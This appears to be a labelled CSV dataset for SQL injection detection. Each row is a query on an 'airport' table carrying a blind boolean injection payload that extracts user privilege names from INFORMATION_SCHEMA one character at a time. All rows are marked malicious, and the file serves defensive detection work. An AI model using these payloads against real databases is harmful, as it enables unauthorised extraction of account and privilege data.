full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>102",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>103",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>110",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>98",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>109",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>99",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>102",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>101",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>48",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>48",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>72",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>48",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>98",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>36",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>60",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>42",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),17,1))>97",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>66",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>36",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>39",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>63",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>42",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>37",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),19,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>39",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),18,1))>38",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>37",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>106",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>38",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>107",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>110",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>98",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>111",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>106",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>99",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>107",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>98",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>112",1,airport-S2,Unknown,Unknown
